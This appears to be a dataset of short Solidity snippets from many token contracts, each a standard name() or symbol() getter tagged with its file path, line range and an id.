<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="72" endline="74" pcid="81">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x307121b525b8d83a37bf77c2c71c2a9e75ea7141.sol" startline="48" endline="50" pcid="1499">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="72" endline="74" pcid="3620">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="54" endline="56" pcid="326">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="37" endline="39" pcid="8043">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="68" endline="70" pcid="2540">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="65" endline="67" pcid="4285">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="65" endline="67" pcid="8004">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="50" endline="52" pcid="2106">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="57" endline="59" pcid="399">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="123" endline="125" pcid="3812">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="70" endline="72" pcid="7517">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="70" endline="72" pcid="7540">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="53" endline="55" pcid="855">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="50" endline="52" pcid="5715">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="56" endline="58" pcid="3616">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="68" endline="70" pcid="2785">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="54" endline="56" pcid="4671">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="394" endline="396" pcid="5282">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="51" endline="53" pcid="2878">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="70" endline="72" pcid="8911">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="50" endline="52" pcid="8480">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa1754e6c03f9e03b36f416a585df4357247c2a83.sol" startline="48" endline="50" pcid="5840">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="54" endline="56" pcid="4928">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="54" endline="56" pcid="1441">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="66" endline="68" pcid="3884">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="71" endline="73" pcid="7860">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="54" endline="56" pcid="815">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="67" endline="69" pcid="7698">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="68" endline="70" pcid="3712">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="68" endline="70" pcid="6426">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="62" endline="64" pcid="5591">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="63" endline="65" pcid="2720">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="54" endline="56" pcid="675">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="686" endline="688" pcid="8076">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="383" endline="385" pcid="3691">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="68" endline="70" pcid="5629">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="74" endline="76" pcid="2525">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="378" endline="380" pcid="5278">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="65" endline="67" pcid="8614">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="70" endline="72" pcid="4210">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="52" endline="54" pcid="4789">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="54" endline="56" pcid="1559">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="75" endline="77" pcid="5849">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="66" endline="68" pcid="6581">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="69" endline="71" pcid="1005">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="69" endline="71" pcid="7165">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="50" endline="52" pcid="922">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="52" endline="54" pcid="3305">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="67" endline="69" pcid="8259">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="53" endline="55" pcid="4073">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="70" endline="72" pcid="4332">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="69" endline="71" pcid="2961">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="51" endline="53" pcid="4313">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="49" endline="51" pcid="2143">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="66" endline="68" pcid="6119">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="67" endline="69" pcid="1259">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="70" endline="72" pcid="6840">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="63" endline="65" pcid="2233">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="55" endline="57" pcid="7856">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="70" endline="72" pcid="6229">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA9c3D3fB7C16334230E696d07DB378FcE2F0Aa38.sol" startline="35" endline="37" pcid="6175">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="52" endline="54" pcid="2165">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="54" endline="56" pcid="4221">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="378" endline="380" pcid="3023">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="54" endline="56" pcid="7438">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="67" endline="69" pcid="4872">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="53" endline="55" pcid="7161">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="69" endline="71" pcid="6050">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="66" endline="68" pcid="7819">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="141" endline="143" pcid="4168">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="55" endline="57" pcid="2244">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="126" endline="128" pcid="368">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="70" endline="72" pcid="3088">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="51" endline="53" pcid="8547">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="49" endline="51" pcid="7739">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="52" endline="54" pcid="62">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="51" endline="53" pcid="830">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="64" endline="66" pcid="1430">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="70" endline="72" pcid="5448">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="54" endline="56" pcid="5142">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="50" endline="52" pcid="9188">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="54" endline="56" pcid="3560">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="50" endline="52" pcid="7307">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="50" endline="52" pcid="6577">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="53" endline="55" pcid="6085">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="54" endline="56" pcid="1396">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="385" endline="387" pcid="26">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="142" endline="144" pcid="4503">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="70" endline="72" pcid="3426">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="470" endline="472" pcid="7887">
    function name() public view returns (string memory) {
      return _name;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="54" endline="56" pcid="9017">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="66" endline="68" pcid="8019">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="56" endline="58" pcid="4587">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="66" endline="68" pcid="9192">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="53" endline="55" pcid="6046">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="57" endline="59" pcid="8164">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="70" endline="72" pcid="2897">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="69" endline="71" pcid="859">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="53" endline="55" pcid="1945">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="51" endline="53" pcid="5088">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="50" endline="52" pcid="1142">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="50" endline="52" pcid="7146">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="53" endline="55" pcid="5640">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="422" endline="424" pcid="7768">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="50" endline="52" pcid="786">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="71" endline="73" pcid="1065">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="54" endline="56" pcid="7513">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="71" endline="73" pcid="4347">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="57" endline="59" pcid="8194">
    function symbol() public view returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="66" endline="68" pcid="5719">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="66" endline="68" pcid="3804">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="50" endline="52" pcid="1305">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="50" endline="52" pcid="5384">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="70" endline="72" pcid="3486">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="69" endline="71" pcid="4968">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="52" endline="54" pcid="2863">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="50" endline="52" pcid="4129">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA9c3D3fB7C16334230E696d07DB378FcE2F0Aa38.sol" startline="31" endline="33" pcid="6174">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="70" endline="72" pcid="2703">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="55" endline="57" pcid="1505">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="67" endline="69" pcid="212">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="53" endline="55" pcid="3234">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="52" endline="54" pcid="429">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="52" endline="54" pcid="1179">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="52" endline="54" pcid="5625">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="50" endline="52" pcid="6115">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="51" endline="53" pcid="8255">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="70" endline="72" pcid="7591">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="49" endline="51" pcid="2684">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="141" endline="143" pcid="3740">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="50" endline="52" pcid="92">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="53" endline="55" pcid="4602">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="66" endline="68" pcid="7150">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="70" endline="72" pcid="9021">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="379" endline="381" pcid="7906">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="477" endline="479" pcid="7888">
    function symbol() public view returns (string memory) {
      return _symbol;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="50" endline="52" pcid="7831">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="66" endline="68" pcid="4046">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="69" endline="71" pcid="8599">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="66" endline="68" pcid="8812">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="54" endline="56" pcid="6836">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="114" endline="116" pcid="3510">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="70" endline="72" pcid="4402">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="72" endline="74" pcid="8289">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="65" endline="67" pcid="4031">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="53" endline="55" pcid="2012">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="70" endline="72" pcid="1914">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="67" endline="69" pcid="2882">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="67" endline="69" pcid="4387">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="68" endline="70" pcid="4793">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="55" endline="57" pcid="726">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="51" endline="53" pcid="3219">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="67" endline="69" pcid="1161">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="51" endline="53" pcid="2061">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="71" endline="73" pcid="2419">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="52" endline="54" pcid="711">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
